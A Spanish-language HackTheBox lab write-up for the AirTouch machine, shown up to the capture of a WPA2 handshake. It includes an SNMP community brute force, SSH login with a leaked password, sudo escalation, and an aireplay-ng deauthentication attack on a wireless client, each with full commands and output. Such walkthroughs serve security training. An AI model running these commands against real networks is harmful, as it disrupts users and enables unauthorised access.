---
title: HackTheBox AirTouch Writeup
published: true
---


>**AirTouch** simula un entorno de red inalámbrica. Comenzaré obteniendo una contraseña predeterminada de SNMP a SSH como usuario consultor dentro de un contenedor con interfaces inalámbricas virtuales. Desde allí, capturaré y descifraré un handshake `WPA2-PSK` para unirme a la red de tabletas, luego descifraré el tráfico capturado en WireShark para recuperar las cookies de sesión para un sitio de administración de enrutador. Una cookie de rol del lado del cliente controla una función de carga de administrador, donde eludiré el filtro de extensión PHP con un archivo phtml para obtener RCE. Las credenciales codificadas en el código fuente me dan el siguiente usuario, y sudo me da root, donde encuentro los certificados CA y de servidor para la red inalámbrica corporativa. Usaré esos con eaphammer para establecer un gemelo malvado de `AirTouch-Office` y capturar un desafío *PEAP-MSCHAPv2*, que descifra para revelar la contraseña de un usuario. Eso me da acceso a la red corporativa, donde un archivo hostapd eap_user filtra una contraseña de administrador, y sudo me da root.

-


# 🔍 Reconocimiento


## Escaneo TCP

**nmap** Encuentra solo un puerto TCP abierto, SSH (22):

```bash
jorge@hacky$ sudo nmap -p- -vvv --min-rate 10000 10.129.244.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-11 05:07 UTC
...[snip]...
Nmap scan report for 10.129.244.98
Host is up, received reset ttl 63 (0.025s latency).
Scanned at 2026-04-11 05:07:23 UTC for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
           Raw packets sent: 69959 (3.078MB) | Rcvd: 65536 (2.621MB)
jorge@hacky$ sudo nmap -p 22 -sCV 10.129.244.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-11 05:07 UTC
Nmap scan report for 10.129.244.98
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)
|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)
|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds

```

Según la versión de *OpenSSH* , es probable que el host esté ejecutando `Ubuntu Focal 20.04` LTS (o quizás Ubuntu Groovy 10.10).

El TTL muestra 62, que es uno menos de lo que esperaría para Linux a un salto de distancia. Esto implica que podría estar interactuando con un contenedor o una máquina virtual.


## Escaneo UDP

Siempre me han disgustado **nmap** los escaneos UDP, ya que son lentos y difíciles de interpretar. `UDP` es complicado porque no hay un protocolo de enlace como con TCP, por lo que determinar si un puerto está abierto puede implicar enviar datos válidos del protocolo que se está utilizando, no solo iniciar una conexión.

Un *nmap* escaneo de los `1000` puertos principales tardó más de 36 minutos:


```bash

jorge@hacky$ sudo nmap -sU -sC --min-rate 10000 10.129.244.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-11 05:17 UTC
Nmap scan report for 10.129.244.98                                                                                                     
Host is up (0.024s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE      
161/udp   open   snmp         
| snmp-info:                  
|   enterprise: net-snmp      
|   engineIDFormat: unknown 
|   engineIDData: 7dee5d68b649d96900000000
|   snmpEngineBoots: 1                                             
|_  snmpEngineTime: 3h12m45s                                       
| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
|_  System uptime: 3h12m45.44s (1156544 timeticks)       
1057/udp  closed startron
3456/udp  closed IISrpc-or-vat                                     
9001/udp  closed etlservicemgr
18869/udp closed unknown      
49198/udp closed unknown      
49396/udp closed unknown      
                                 
Nmap done: 1 IP address (1 host up) scanned in 2168.27 seconds

```

El sistema identifica algunos puertos como "cerrados" (se recibió un paquete que indicaba que el puerto estaba cerrado, en lugar de simplemente no haber recibido respuesta) y detecta que el protocolo `SNMP` está abierto en el puerto 161.

*masscan* Solo tarda un par de minutos, pero no encuentra nada:



```bash

jorge@hacky$ sudo masscan -pU:1-65535 --rate 1000 10.129.244.98
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-04-11 20:42:54 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
```

Voy a probar *UDPX* . Comprueba más de 45 puertos UDP comunes utilizando cargas útiles específicas del protocolo diseñadas para obtener una respuesta. Se instala con `go install -v github.com/nullt3r/udpx/cmd/udpx@latesty` detecta SNMP en menos de 30 segundos:


```bash
jorge@hacky$ udpx -t 10.129.244.98

        __  ______  ____ _  __
       / / / / __ \/ __ \ |/ /
      / / / / / / / /_/ /   / 
     / /_/ / /_/ / ____/   |  
     \____/_____/_/   /_/|_|  
         v1.0.7, by @nullt3r

2026/04/11 07:05:53 [+] Starting UDP scan on 1 target(s)
2026/04/11 07:06:01 [*] 10.129.244.98:161 (snmp)
2026/04/11 07:06:17 [+] Scan completed

```

# 🔐 SNMP - UDP 161

La *nmap* salida del script ya muestra una descripción interesante del sistema: “La contraseña predeterminada del consultor es:` RxBlZhLmOkacNWScmZ6D `(cámbiela después de usarla)”.

Una herramienta como **onesixtyone** realizará un ataque de fuerza bruta contra la cadena de comunidad SNMP:

```bash
jorge@hacky$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.129.244.98
Scanning 1 hosts, 3219 communities
10.129.244.98 [public] "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
10.129.244.98 [public] "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
```

También puedo suponer que "público" funcionará para la información a la que se debe acceder sin autenticación.

**snmpwalk** volcará toda la información `SNMP`:


```bash

jorge@hacky$ snmpwalk -v 2c -c public 10.129.244.98
SNMPv2-MIB::sysDescr.0 = STRING: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6802958) 18:53:49.58
SNMPv2-MIB::sysContact.0 = STRING: admin@AirTouch.htb
SNMPv2-MIB::sysName.0 = STRING: Consultant
SNMPv2-MIB::sysLocation.0 = STRING: "Consultant pc"
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (0) 0:00:00.00
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6810149) 18:55:01.49
HOST-RESOURCES-MIB::hrSystemUptime.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

La descripción es lo único interesante aquí.


# 🧑‍💻 Shell como root@AirTouch-Consultant

## SSH como consultor

Usaré la contraseña de *SNMP* para obtener una consola con SSH como usuario consultor:

```bash
jorge@hacky$ sshpass -p RxBlZhLmOkacNWScmZ6D ssh consultant@10.129.244.98
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
consultant@AirTouch-Consultant:~$
```

El sistema operativo anfitrión es `Ubuntu 20.04`, tal como se preveía.

## Enumeración de usuarios

El usuario consultor es el único usuario con un directorio de inicio en `/home`:

```bash
consultant@AirTouch-Consultant:~$ ls /home/
consultant

```

Esto coincide con los usuarios que tienen `shells` configurados en passwd:

```bash
consultant@AirTouch-Consultant:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
consultant:x:1000:1000::/home/consultant:/bin/bash

```

El directorio personal del usuario consultor está vacío, a excepción de dos imágenes:

```bash
consultant@AirTouch-Consultant:~$ find . -type f
./.bashrc
./.profile
./.bash_logout
./.cache/motd.legal-displayed
./diagram-net.png
./photo_2023-03-01_22-04-52.png

```

Voy a coger cada uno de estos `scp`:

```bash
jorge@hacky$ sshpass -p RxBlZhLmOkacNWScmZ6D scp consultant@10.129.244.98:~/*.png .
```

Las dos imágenes del directorio personal del consultor son mapas de red. La primera es un diagrama dibujado a mano:


![Captura de pantalla de la web](assets/images/AirTouch/imagen1.webp)


El segundo es un diagrama generado por computadora que muestra aproximadamente la misma arquitectura con más detalle:

![Captura de pantalla de la web](assets/images/AirTouch/imagen2.webp)

Esto también demuestra que `SSH (TCP 22) y SNMP (UDP 161)` se están reenviando al portátil del consultor a través de esos mismos puertos.

Voy a anotar las tres subredes:

![Captura de pantalla de la web](assets/images/AirTouch/imagen3.png)

# sudo

El consultor puede ejecutar cualquier comando como root usando sudo:

```bash
consultant@AirTouch-Consultant:~$ sudo -l
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```    
`sudo -i` proporciona una consola de root:

```bash
consultant@AirTouch-Consultant:~$ sudo -i
root@AirTouch-Consultant:~# 
```

# Conexión a AirTouch-Internet

## Enumeración
## Directorio principal

`/root` Contiene un directorio interesante:

```bash
root@AirTouch-Consultant:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .profile  .wget-hsts  eaphammer

```

**eaphammer** es una herramienta para ejecutar ataques de gemelo malicioso dirigidos contra redes `WPA2-Enterprise.` El `wget-hsts` archivo muestra contacto con GitHub, probablemente descargando eaphammer:

```bash
# HSTS 1.0 Known Hosts database for GNU Wget.
# Edit at your own risk.
# <hostname>    <port>  <incl. subdomains>      <created>       <max-age>
raw.githubusercontent.com       0       0       1711555940      31536000
github.com      0       1       1711555935      31536000
codeload.github.com     0       0       1711555669      31536000
```

## Red

`ip addr` muestra 9 interfaces:

```bash
root@AirTouch-Consultant:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether ea:9a:2d:5f:53:dc brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```

`eth0` tiene la IP *172.20.1.2/24*, que coincide con la que tiene el portátil del consultor en el diagrama.

**eth0@if29** Esto significa que se trata de un par veth (Ethernet virtual), es decir, un extremo de un cable de red virtual. "eth0" es el nombre de la interfaz dentro de este contenedor, y "@if29" indica que el otro extremo del par veth es la interfaz con índice 29 en el host. Esto confirma que esta shell se encuentra dentro de un contenedor (Docker/LXC).

Las siete interfaces inalámbricas están fuera de servicio.

Voy a activar una de las interfaces inalámbricas y buscar puntos de acceso visibles:

```bash
root@AirTouch-Consultant:~# ip link set wlan0 up
root@AirTouch-Consultant:~# iwlist wlan0 scan
wlan0     Scan completed :
          Cell 01 - Address: 8A:68:3A:D6:EB:29
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"vodafoneFB6N"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f435a4
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000C766F6461666F6E654642364E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (1) : TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 02 - Address: 3E:16:E6:E4:3C:72
                    Channel:3
                    Frequency:2.422 GHz (Channel 3)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"MOVISTAR_FG68"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f62a6f
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000D4D4F5649535441525F46473638
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030103
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 03 - Address: 92:52:98:67:66:19
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"WIFI-JOHN"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f927f1
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 0009574946492D4A4F484E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 04 - Address: F0:9F:C2:A3:F1:A7
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"AirTouch-Internet"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104f92ec5
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 0011416972546F7563682D496E7465726E6574
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 05 - Address: F2:2A:26:A4:0B:29
                    Channel:9
                    Frequency:2.452 GHz (Channel 9)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"MiFibra-24-D4VY"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f3104fc154d
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F4D6946696272612D32342D44345659
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030109
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f310502ea81
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064f310502eac0
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
```

¡Encuentra siete! Lo usaré greppara obtener una lista mejor:

```bash
root@AirTouch-Consultant:/# iwlist wlan0 scan | grep -e ESSID -e Frequency -e Address
          Cell 01 - Address: 8A:68:3A:D6:EB:29
                    Frequency:2.412 GHz (Channel 1)
                    ESSID:"vodafoneFB6N"
          Cell 02 - Address: 3E:16:E6:E4:3C:72
                    Frequency:2.422 GHz (Channel 3)
                    ESSID:"MOVISTAR_FG68"
          Cell 03 - Address: 92:52:98:67:66:19
                    Frequency:2.437 GHz (Channel 6)
                    ESSID:"WIFI-JOHN"
          Cell 04 - Address: F0:9F:C2:A3:F1:A7
                    Frequency:2.437 GHz (Channel 6)
                    ESSID:"AirTouch-Internet"
          Cell 05 - Address: F2:2A:26:A4:0B:29
                    Frequency:2.452 GHz (Channel 9)
                    ESSID:"MiFibra-24-D4VY"
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
```

El 4 es `AirTouch-Internet,` y el 6 y el 7 son puntos de acceso para `AirTouch-Office.` El resto parece estar fuera del alcance.


## Monitoreo WiFi

Las herramientas **aircrack-ng** también están instaladas en el host. Las usaré `airmon-ng` para poner la interfaz wlan0 en modo monitor:

```bash
root@AirTouch-Consultant:/# airmon-ng start wlan0
Your kernel has module support but you don't have modprobe installed.
It is highly recommended to install modprobe (typically from kmod).
Your kernel has module support but you don't have modinfo installed.
It is highly recommended to install modinfo (typically from kmod).
Warning: driver detection without modinfo may yield inaccurate results.


PHY     Interface       Driver          Chipset

phy0    wlan0           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
phy1    wlan1           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy2    wlan2           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy3    wlan3           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy4    wlan4           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy5    wlan5           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy6    wlan6           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
```

Esto permitió que dicha interfaz escuchara pasivamente todo el tráfico inalámbrico en los canales cercanos, no solo el dirigido a este host.

Voy `airodump-ng wlan0mon -band abg` a empezar a capturar el tráfico. Por defecto, solo captura en canales de 2,4 GHz. *--band abg* Le indico que capture en 802.11a (5 GHz), 802.11b (2,4 GHz) y 802.11g (2,4 GHz).

```bash
 CH  4 ][ Elapsed: 1 min ][ 2026-04-12 01:04                       

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AC:8B:A9:F3:A1:13  -28       79        1    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office
 AC:8B:A9:AA:3F:D2  -28       79        1    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office
 F0:9F:C2:A3:F1:A7  -28       41        0    0   6   54        CCMP   PSK  AirTouch-Internet
 5E:C1:55:84:B8:82  -28       41        0    0   6   54        CCMP   PSK  WIFI-JOHN
 EE:A4:41:B9:58:7B  -28       39        0    0   9   54   WPA2 CCMP   PSK  MiFibra-24-D4VY
 26:64:F9:22:5C:4C  -28       78        0    0   3   54        CCMP   PSK  MOVISTAR_FG68
 AE:E8:96:04:55:48  -28     2330        0    0   1   54        TKIP   PSK  vodafoneFB6N

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 AC:8B:A9:AA:3F:D2  28:6C:07:12:EE:F3  -29    0 - 1      0       12         AirTouch-Office
 AC:8B:A9:AA:3F:D2  C8:8A:9A:6F:F9:D2  -29    0 - 1e     0       19         AccessLink,AirTouch-Office
 (not associated)   28:6C:07:12:EE:A1  -29    0 - 1      4       12         AirTouch-Office
```

La sección superior muestra los AP visibles. Hay seis SSID de difusión en siete puntos de acceso, cuatro usando cifrado CCMP con autenticación PSK, AirTouch-Office usando cifrado CCMP con autenticación MGT y uno usando TKIP con autenticación PSK. Los relevantes son *AirTouch-Internet*(la VLAN de las tabletas) en el canal 6 y *AirTouch-Office* en el canal 44. Los demás ( WIFI-JOHN, MiFibra-24-D4VY, MOVISTAR_FG68, vodafoneFB6N) parecen ser redes vecinas que no forman parte de este entorno. El *AirTouch-Internet* punto de acceso tiene una MAC dentro del rango de Ubiquiti (F0:9F:C2).

En este momento no es importante, pero *AirTouch-Office* no aparece si no escaneo las bandas de 5 GHz (canales 36, 40, 44, 48, etc.).

La sección inferior muestra los clientes. Un cliente ( 28:6C:07:FE:A3:22) está asociado a *AirTouch-Internet.* Otros tres clientes no están asociados y están enviando solicitudes de sondeo para AirTouch-Office. Uno de los clientes ( C8:8A:9A:6F:F9:D2) también está sondeando para AccessLink.

# Recuperar contraseña

## Estrategia

Desde aquí existen dos posibles vías de ataque:

1.Gemelo malvado para *AirTouch-Office:* Tres clientes están buscando activamente un punto de acceso que no existe, lo que parece una configuración ideal para un gemelo malvado. Sin embargo, los intentos iniciales fallaron:

- Un dispositivo gemelo malicioso `WPA2-Enterprise (EAP) eaphammerno` registró ningún intento de conexión. Esto sugiere que los clientes no están configurados para EAP.

- Un dispositivo gemelo malicioso con *WPA2-PSK hostapd-eaphammer* tampoco logró establecer conexiones. Es posible que los clientes esperen autenticación abierta, o que haya interferencias por `wlan0` monsalto de canal en la misma radio simulada mientras el punto de acceso malicioso intenta funcionar en el canal 6.

- Dado que `AirTouch-Office` no está emitiendo, desconocemos su tipo de autenticación real, lo que dificulta que coincida con lo que esperan los clientes.

2.Descifrar `AirTouch-Internet:` este punto de acceso es visible, transmite en el canal 6, utiliza `WPA2-CCMP PSK` y tiene un cliente activo *( 28:6C:07:FE:A3:22).* El ataque es sencillo: desautenticar al cliente, capturar el handshake de cuatro vías WPA2 cuando se reconecte y descifrar la PSK sin conexión. Esto nos permite acceder a la VLAN de las tabletas.
Volveré a hablar de Evil Twin más adelante, pero por ahora me centraré en AirTouch-Internet.

## Capturar autenticación

Voy a ejecutarlo `airodump -ng wlan0mon --channel 6 --bssid F0:9F:C2:A3:F1:A7 -w /tmp/airtouch_capture` para entrar en un estado de colección. En otra terminal, usaré esto *aireplay-ng* para desautenticar al cliente conectado:

```bash
root@AirTouch-Consultant:~# aireplay-ng --deauth 5 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0mon
01:55:47  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6
01:55:47  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:48  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:48  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:49  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
01:55:49  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]

```
Envía cinco ráfagas (desde --deauth 5) de 64 tramas de desautenticación.

Ahora puedo copiar la captura con Ctrl+C. Dentro `/tmp` hay un montón de archivos relacionados:

```bash
root@AirTouch-Consultant:~# ls -l /tmp/airtouch_capture-01.*
-rw-r--r-- 1 root root  64933 Apr 12 01:56 /tmp/airtouch_capture-01.cap
-rw-r--r-- 1 root root    488 Apr 12 01:56 /tmp/airtouch_capture-01.csv
-rw-r--r-- 1 root root    596 Apr 12 01:56 /tmp/airtouch_capture-01.kismet.csv
-rw-r--r-- 1 root root   2707 Apr 12 01:56 /tmp/airtouch_capture-01.kismet.netxml
